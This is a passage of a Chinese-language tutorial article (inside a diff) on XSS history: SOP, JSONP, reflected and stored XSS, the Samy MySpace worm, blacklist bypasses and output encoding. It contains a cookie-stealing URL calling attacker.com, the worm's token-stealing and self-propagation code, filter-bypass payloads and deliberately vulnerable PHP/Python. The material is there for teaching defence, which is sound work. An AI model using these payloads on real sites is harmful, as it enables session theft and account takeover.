+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- handleData({&#34;name&#34;: &#34;Alice&#34;, &#34;age&#34;: 30}) --&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 浏览器执行这段 JS，handleData 函数被调用，a.com 的代码就拿到了数据 --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nx">handleData</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span> <span class="c1">// &#34;Alice&#34;
+</span></span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>JSONP 很聪明，但它本质上是把 API 端点变成了一个&quot;执行调用方指定函数名&quot;的代码生成器。这个设计埋下了一颗安全隐患：<strong>调用者可以把任意 JavaScript 表达式作为&quot;函数名&quot;传进去</strong>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://b.com/api/user?callback=alert(document.cookie)//
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>b.com 返回：<code>alert(document.cookie)//({&quot;name&quot;: &quot;Alice&quot;})</code> ——直接执行了攻击代码。</p>
+<p>CORS 规范（2009 年）的出现，正是为了给跨域读取提供一个安全的官方解法，从而让 JSONP 这种&quot;民间补丁&quot;退出历史舞台。但 JSONP 端点并没有真正消失——大量老接口至今仍在运行。这个遗留问题，我们在 CSP 章节里还会再次遇到。</p>
+<h3 id="sop-防不住的事注入执行">SOP 防不住的事：注入执行</h3>
+<p>SOP 成功防止了&quot;跨站读取&rdquo;。但回到浏览器中间人的比喻：SOP 能保证包裹来自正确的地址，却无法保证包裹里的内容没有被人动过手脚。</p>
+<p>这就是 XSS 的根本：<strong>不绕过 SOP，而是污染 SOP 信任的源</strong>。</p>
+<p>攻击者不需要让 <code>evil.com</code> 的脚本去读 <code>bank.com</code> 的数据（SOP 会阻止）。他只需要让 <code>bank.com</code> 的页面里，悄悄混入了他写的脚本——然后浏览器会以为那是 <code>bank.com</code> 自己的合法代码，开开心心地执行。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">服务器返回的 HTML：
+</span></span><span class="line"><span class="cl">&lt;p&gt;搜索结果：&lt;script&gt;evil()&lt;/script&gt;&lt;/p&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">浏览器的判断逻辑：
+</span></span><span class="line"><span class="cl">  这段 &lt;script&gt; 来自哪里？→ 来自 bank.com 的响应。
+</span></span><span class="line"><span class="cl">  bank.com 是可信源吗？→ 是。
+</span></span><span class="line"><span class="cl">  那就执行。✓
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">浏览器不知道、也没有能力知道：
+</span></span><span class="line"><span class="cl">  这段脚本是攻击者通过搜索框注入的，不是 bank.com 的开发者写的。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>SOP 完全失效了——不是被绕过了，而是压根没触发，因为这段脚本&quot;合法地&quot;拥有了 <code>bank.com</code> 的来源标签。</p>
+<p>这个认识是理解全文的钥匙：</p>
+<blockquote>
+<p><strong>XSS 的本质不是入侵服务器，而是操纵浏览器这个中间人，让它误以为攻击者的代码是合法的本站代码。</strong></p>
+</blockquote>
+<hr>
+<h2 id="第一章语义歧义一切漏洞的共同根源2000">第一章：语义歧义——一切漏洞的共同根源（2000）</h2>
+<h3 id="11-命名漏洞有了名字">1.1 命名：漏洞有了名字</h3>
+<p>1999 年到 2000 年间，微软安全响应中心收到了越来越多关于一类奇特攻击的报告——攻击者将脚本注入到受信任的网站，借助用户对该网站的信任，在用户的浏览器里执行恶意代码。</p>
+<p>2000 年 1 月，微软工程师与 CERT 合作，在首份公开报告中为这类漏洞正式命名：<strong>Cross-Site Scripting，缩写 XSS</strong>（因为 CSS 已被 Cascading Style Sheets 占用）。</p>
+<p>这个名字精准地描述了攻击结构：恶意脚本（Scripting）借助受信任的站点，完成跨站（Cross-Site）的攻击。</p>
+<h3 id="12-为什么会有-xss语义歧义">1.2 为什么会有 XSS？语义歧义</h3>
+<p>在进入历史案例之前，我们需要先理解一个贯穿本文所有漏洞和防御的底层概念。</p>
+<p>早期 CGI 脚本的典型写法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 1996 年，典型的动态页面</span>
+</span></span><span class="line"><span class="cl"><span class="n">query</span> <span class="o">=</span> <span class="n">get_query_param</span><span class="p">(</span><span class="s2">&#34;search&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;&lt;p&gt;您搜索了：</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s2">&lt;/p&gt;&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>开发者的意图是：把用户输入的<strong>文本数据</strong>显示在页面上。</p>
+<p>但 <code>query</code> 一旦被拼入 HTML 响应，浏览器就以 <strong>HTML 标记语言</strong>的语义来解析整个字符串。</p>
+<p>如果 <code>query = &quot;hello&quot;</code>，两种语义没有冲突。<br>
+如果 <code>query = &quot;&lt;script&gt;evil()&lt;/script&gt;&quot;</code>，冲突就出现了：</p>
+<ul>
+<li>开发者的语义：这是一个搜索词，应当显示出来</li>
+<li>浏览器的语义：这是一段 HTML，其中 <code>&lt;script&gt;</code> 内是可执行代码</li>
+</ul>
+<p><strong>同一段数据，被开发者和浏览器赋予了不同的含义</strong>。开发者没有在数据离开&quot;文本上下文&quot;、进入&quot;HTML 上下文&quot;的那一刻，做任何形式的转换。这个&quot;语义跨越&quot;的瞬间，就是漏洞。</p>
+<blockquote>
+<p><strong>所有注入漏洞——XSS、SQL 注入、命令注入——本质上都是同一件事：<br>
+数据在切换解析上下文时，没有经过适当的转义，导致它被当作代码执行了。</strong></p>
+</blockquote>
+<p>理解了这一点，才能理解为什么防御必须关注&quot;上下文&quot;，为什么黑名单总会失败，为什么&quot;输出编码&quot;是正确答案而不是&quot;输入过滤&quot;。</p>
+<h3 id="13-最早的-reflected-xss镜像攻击">1.3 最早的 Reflected XSS：镜像攻击</h3>
+<p>最早被大量记录的 XSS 形态是<strong>反射型 XSS（Reflected XSS）</strong>，得名于服务器将攻击者的 payload &ldquo;反射&quot;回给受害者的方式。</p>
+<p>攻击路径极其简洁——攻击者只需要构造一个包含 payload 的链接，发给受害者：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://victim.com/search?q=&lt;script&gt;new Image().src=&#39;https://attacker.com?c=&#39;+document.cookie&lt;/script&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>一个典型的有漏洞的搜索页（PHP）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$keyword</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;q&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 开发者意图：显示搜索词（文本）
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 浏览器行为：解析整个字符串为 HTML（代码）
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 语义歧义在这里发生
+</span></span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;搜索结果：</span><span class="si">$keyword</span><span class="s2">&lt;/p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>受害者点击，服务器将 payload 原样嵌回 HTML，浏览器执行，Cookie 被发往攻击者服务器。全程不需要任何服务器漏洞——服务器只是忠实地做了&quot;把输入放回输出&quot;这件事，而浏览器这个中间人，忠实地执行了它收到的全部内容。</p>
+<p>这里有一个值得注意的细节：攻击者用 <code>new Image().src=</code> 来外传数据，而不是 <code>fetch()</code>。原因是图片加载属于&quot;嵌入操作&rdquo;，SOP 默认允许跨域——又一次利用了 SOP 的那个&quot;宽容的嵌入&quot;。</p>
+<hr>
+<h2 id="第二章蠕虫纪元xss-第一次露出獠牙2005">第二章：蠕虫纪元——XSS 第一次露出獠牙（2005）</h2>
+<h3 id="21-samy以及那个改变一切的周末">2.1 Samy，以及那个改变一切的周末</h3>
+<p>2005 年 10 月 4 日，洛杉矶，19 岁的 Samy Kamkar 把一段精心构造的代码放进了他的 MySpace 个人资料页面。</p>
+<p>他的动机相当单纯——他只是想涨粉。&ldquo;也许一个月能涨 100 到 200 个朋友&rdquo;，他想。把代码上传之后，他去睡觉了。</p>
+<p>第二天早上醒来，他有 200 条好友请求。</p>
+<p>一小时后，数字翻了倍。然后是指数级增长。每隔几秒，数以千计的账号被感染。<strong>仅仅 20 小时，超过 100 万个 MySpace 账号中招，其中 1,005,831 人被迫&quot;加了 Samy 为好友&quot;</strong>，并在自己的主页上显示了 &ldquo;but most of all, samy is my hero&rdquo;。</p>
+<p>MySpace 不得不紧急关闭整个平台进行清理。美国特勤局以《爱国者法案》相关条款展开调查。Kamkar 最终被判处 3 年缓刑、720 小时社区服务和 2 万美元赔偿金。</p>
+<p>这是历史上传播速度最快的计算机蠕虫，被记入安全史册。</p>
+<h3 id="22-为什么-reflected-xss-做不到这件事">2.2 为什么 Reflected XSS 做不到这件事</h3>
+<p>要理解 Samy 蠕虫的威力，先要理解它和 Reflected XSS 的本质区别。</p>
+<p>Reflected XSS 需要攻击者把含有 payload 的链接发给每一个受害者——<strong>一对一，主动触发</strong>。规模受限于攻击者能接触到的人数，而且用户往往能从 URL 中察觉到异常。</p>
+<p>Samy 利用的是<strong>存储型 XSS（Stored XSS）</strong>：恶意脚本被存入数据库，任何访问该页面的用户都会触发，无需点击任何特殊链接。</p>
+<p>更关键的是，Samy 的脚本实现了<strong>自我复制</strong>。这使它成为了真正的蠕虫：每一个感染者都成为新的传播源，感染规模呈指数级增长，而不是线性增长。</p>
+<p>蠕虫的核心逻辑：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// 这是在受害者的浏览器里运行的代码——注意：在 MySpace 域下，是&#34;自己人&#34;
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 步骤一：获取当前用户的 CSRF token
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 这一步是关键：脚本在 myspace.com 域下运行，
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 可以直接 fetch myspace.com 的页面并读取其中的 token
+</span></span></span><span class="line"><span class="cl"><span class="c1">// ——这是 CSRF 永远做不到的，因为 CSRF 的代码在 evil.com 域下，
+</span></span></span><span class="line"><span class="cl"><span class="c1">//   SOP 会阻止它读取 myspace.com 响应的内容
+</span></span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="s2">&#34;http://www.myspace.com/index.cfm?fuseaction=profile.previewInterests&#34;</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/hash:\s*&#39;([0-9a-zA-Z]+)&#39;/</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 步骤二：把蠕虫代码本体复制到当前访客的主页（自我传播）
+</span></span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">wormCode</span> <span class="o">=</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">SELF_CODE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">xhr2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">xhr2</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;POST&#34;</span><span class="p">,</span> <span class="s2">&#34;http://www.myspace.com/index.cfm?fuseaction=profile.update&#34;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">xhr2</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">,</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">xhr2</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;interestLabel=heroes&amp;submit=Preview&amp;hash=&#34;</span> <span class="o">+</span> <span class="nx">token</span> <span class="o">+</span> <span class="s2">&#34;&amp;heroes=&#34;</span> <span class="o">+</span> <span class="nx">wormCode</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 步骤三：发送好友请求给 Samy
+</span></span></span><span class="line"><span class="cl"><span class="c1">// ...（类似的 POST 请求）
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>步骤一揭示了 XSS 比 CSRF 危险得多的根本原因：<strong>脚本在受害者的域下运行，它就是&quot;自己人&quot;，SOP 对它没有任何限制</strong>。CSRF 只能盲目地发请求，拿不到响应内容，因此无法获取 CSRF token；而 XSS 可以读取页面上的任何内容，然后用这些数据发出带着合法 token 的请求——CSRF 的所有防御，对 XSS 形同虚设。</p>
+<p>这也正是浏览器作为&quot;中间人&quot;的危险所在：一旦攻击者的代码获得了浏览器的&quot;信任执行权&quot;，它就能以用户的身份做几乎任何事情，而浏览器无从区分。</p>
+<h3 id="23-samy-面对的工程挑战绕过黑名单">2.3 Samy 面对的工程挑战——绕过黑名单</h3>
+<p>Samy 的代码之所以精妙，不只是逻辑设计，还在于它成功绕过了 MySpace 的一系列过滤器。而这些绕过手法，恰好预演了下一个时代攻防博弈的全貌：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// MySpace 过滤了 &#34;javascript&#34; 和 &#34;onreadystatechange&#34; 这两个词
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 解决方案：把它们拆开，运行时再拼合
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 比如用 eval(&#39;xmlhttp.onread&#39; + &#39;ystatechange = callback&#39;)
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// MySpace 要求所有样式必须在 CSS 中，不允许 &lt;script&gt; 标签
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 解决方案：通过 CSS 的 expression() 注入（当时 IE 支持）
+</span></span></span><span class="line"><span class="cl"><span class="c1">// &lt;div style=&#34;background:url(&#39;javascript:...&#39;)&#34;&gt;（某些浏览器执行）
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 代码里不能包含自己代码的字面量（否则递归复制会出问题）
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 解决方案：把关键片段编码存储，运行时解码重建
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>整个蠕虫代码里，<strong>没有出现一个 <code>&lt;script&gt;</code> 标签</strong>。Samy 绕过了 MySpace 的每一道黑名单过滤——这不是偶然，而是黑名单防御的系统性失败。</p>
+<hr>
+<h2 id="第三章猫和老鼠黑名单时代的必然崩塌20032008">第三章：猫和老鼠——黑名单时代的必然崩塌（2003–2008）</h2>
+<h3 id="31-直觉性的错误">3.1 直觉性的错误</h3>
+<p>面对 XSS，开发者的第一反应几乎都是：&ldquo;把 <code>&lt;script&gt;</code> 过滤掉不就好了？&rdquo;</p>
+<p>这个直觉完全合理——在日常生活中，应对危险的方式就是识别并禁止已知的危险物。</p>
+<p>但这个直觉忽略了一件事：我们在序章里说过，XSS 的根源是<strong>语义歧义</strong>，而不是<strong>某个特定的字符串</strong>。你无法通过穷举&quot;危险字符串&quot;来解决一个因&quot;上下文切换&quot;产生的问题，就像你不能靠封锁&quot;剪刀&quot;这个词来阻止所有的危险行为——刀、玻璃、牙齿，威胁的形态是无限的。</p>
+<p>HTML 就是这样一门语言。它被设计成&quot;容错优先&quot;——浏览器的解析器遇到任何不规范的写法，都会尽力猜测意图并渲染，而不是报错停止。这意味着，通往&quot;执行脚本&quot;的路径，在 HTML 里是指数级多的，而任何黑名单都是有限的。</p>
+<h3 id="32-一场永远追不上的军备竞赛">3.2 一场永远追不上的军备竞赛</h3>
+<p><strong>第一代防御</strong>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sanitize_v1</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;&lt;script&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;&lt;/script&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>立刻被大小写绕过：<code>&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</code><br>
+或者双写（过滤一次后残余仍然有效）：<code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code></p>
+<p><strong>第二代防御</strong>：大小写不敏感的正则。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&lt;script.*?&gt;.*?&lt;/script&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span> <span class="o">|</span> <span class="n">re</span><span class="o">.</span><span class="n">DOTALL</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>攻击者直接放弃 <code>&lt;script&gt;</code> 标签，转向 HTML 事件属性。HTML 里几乎每个元素都支持数十种事件属性，你没法把它们全过滤掉：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;x&#34;</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;evil()&#34;</span><span class="p">&gt;</span>        <span class="c">&lt;!-- 图片加载失败时触发 --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">svg</span> <span class="na">onload</span><span class="o">=</span><span class="s">&#34;evil()&#34;</span><span class="p">&gt;</span>                  <span class="c">&lt;!-- SVG 加载时触发 --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">autofocus</span> <span class="na">onfocus</span><span class="o">=</span><span class="s">&#34;evil()&#34;</span><span class="p">&gt;</span>    <span class="c">&lt;!-- 页面加载时自动聚焦触发 --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">details</span> <span class="na">open</span> <span class="na">ontoggle</span><span class="o">=</span><span class="s">&#34;evil()&#34;</span><span class="p">&gt;</span>      <span class="c">&lt;!-- details 元素展开时触发 --&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>第三代防御</strong>：过滤所有 <code>on*</code> 事件属性。</p>
+<p>攻击者转向 <code>href</code> 属性里的 <code>javascript:</code> 伪协议：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;javascript:evil()&#34;</span><span class="p">&gt;</span>click me<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>并且，浏览器在解析 <code>href</code> 时会先做规范化处理，再判断协议——这意味着以下所有写法，对浏览器都等价，但很多过滤器会放行它们：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;java&amp;#x09;script:evil()&#34;</span><span class="p">&gt;</span>click<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>    <span class="c">&lt;!-- 插入制表符 \t --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;java
+</span></span></span><span class="line"><span class="cl"><span class="s">script:evil()&#34;</span><span class="p">&gt;</span>click<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>                        <span class="c">&lt;!-- 插入换行符 \n --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;evil()&#34;</span><span class="p">&gt;</span>click<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 完全 HTML 实体编码，浏览器解码后执行 --&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里再次是<strong>语义歧义</strong>：过滤器以&quot;文本匹配&quot;的语义来检查字符串，而浏览器以&quot;URL 规范化后的语义&quot;来解析属性值。两者的语义不同，过滤器看到的是无害内容，浏览器执行的是脚本。</p>
+<h3 id="33-黑名单失败的本质">3.3 黑名单失败的本质</h3>
+<p>这场军备竞赛可以无限持续下去，因为双方的&quot;武器基础&quot;不对等：</p>
+<ul>
+<li><strong>攻击者</strong>的武器是 HTML 的语义空间——标签、属性、事件、协议、编码方式的所有组合，理论上是无穷的。</li>
+<li><strong>防御者</strong>的武器是一个有限的黑名单——无论多详尽，总会有遗漏。</li>
+</ul>
+<p>正确的思路的方向，只有两个：</p>
+<p>一是<strong>转变视角</strong>：不去问&quot;什么是危险的&quot;，而去问&quot;什么是允许的&quot;。把黑名单换成白名单——这就是后来富文本防御的基础。</p>
+<p>二是<strong>在正确的位置做防御</strong>：不是在输入时过滤字符，而是在数据<strong>进入新的解析上下文时</strong>，消除语义歧义。这就是输出编码。</p>
+<hr>
+<h2 id="第四章消除语义歧义输出编码的正确姿势20052010">第四章：消除语义歧义——输出编码的正确姿势（2005–2010）</h2>
+<h3 id="41-对症下药">4.1 对症下药</h3>
+<p>回到语义歧义的根源：漏洞发生在数据被放入 HTML 上下文的那一刻，浏览器把数据中的特殊字符解析为了 HTML 语法符号。</p>
+<p><strong>输出编码</strong>的解法非常直接：<strong>在数据越过&quot;文本上下文&quot;进入&quot;HTML 上下文&quot;的边界时，把所有可能产生语义歧义的字符，转换为它们的 HTML 表示形式</strong>。</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>原始字符</th>
+          <th>HTML 实体</th>
+          <th>效果</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>&lt;</code></td>
+          <td><code>&amp;lt;</code></td>
+          <td>不再是标签的开始</td>
+      </tr>
+      <tr>
+          <td><code>&gt;</code></td>
+          <td><code>&amp;gt;</code></td>
+          <td>不再是标签的结束</td>
+      </tr>
+      <tr>
+          <td><code>&quot;</code></td>
+          <td><code>&amp;quot;</code></td>
+          <td>不再能闭合属性值</td>
+      </tr>
+      <tr>
+          <td><code>'</code></td>
+          <td><code>&amp;#x27;</code></td>
+          <td>同上（单引号）</td>
+      </tr>
+      <tr>
+          <td><code>&amp;</code></td>
+          <td><code>&amp;amp;</code></td>
+          <td>防止实体注入</td>
+      </tr>
+  </tbody>
+</table></div>
+<p>经过编码，攻击者的 payload 变成了浏览器无法执行的文本：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- 用户输入：&lt;script&gt;evil()&lt;/script&gt; --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 编码后输出：--&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="ni">&amp;lt;</span>script<span class="ni">&amp;gt;</span>evil()<span class="ni">&amp;lt;</span>/script<span class="ni">&amp;gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 浏览器将其显示为纯文本字符，不执行 --&gt;</span>
